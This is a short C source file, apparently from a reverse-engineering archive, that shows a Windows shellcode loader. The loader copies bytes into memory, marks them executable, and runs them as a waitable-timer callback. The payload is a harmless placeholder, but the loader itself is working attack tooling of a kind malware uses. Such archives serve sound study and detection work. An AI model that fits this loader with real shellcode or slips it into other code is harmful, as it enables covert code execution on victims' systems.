/*
    Shellcode Loader
    Archive of Reversing.ID

    Executing shellcode in timer.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - permission: VirtualProtect
    - execution:  CreateWaitableTimer + SetWaitableTimer + SleepEx
*/

#include <windows.h>
#include <stdint.h>

#define _SECOND 10000000

int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    HANDLE      timer;
    LARGE_INTEGER   duetime;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        // creating waitable timer
        timer = CreateWaitableTimer (NULL, FALSE, NULL);

        // set up timer (2 seconds later)
        duetime.QuadPart = (ULONGLONG) -2 * _SECOND;
        SetWaitableTimer (timer, &duetime, 1000, (PTIMERAPCROUTINE)runtime, NULL, FALSE);

        // set thread to alertable state 
        SleepEx (INFINITE, TRUE);

        // close the handle to the event
        CloseHandle (timer);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}